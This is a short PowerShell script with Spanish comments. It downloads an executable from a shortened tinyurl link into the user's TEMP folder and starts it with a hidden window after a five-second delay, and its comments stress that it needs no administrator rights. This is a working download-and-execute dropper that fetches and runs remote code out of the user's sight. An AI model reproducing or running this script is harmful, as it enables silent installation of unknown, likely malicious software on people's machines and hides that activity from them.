# Define la URL del archivo .exe
$url = "https://tinyurl.com/tnxcvyr8"

# Espera a que el sistema esté listo
Start-Sleep -Seconds 5

# Ejecuta el script sin necesidad de permisos de administrador
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\archivo.exe"
Start-Process "$env:TEMP\archivo.exe" -WindowStyle Hidden
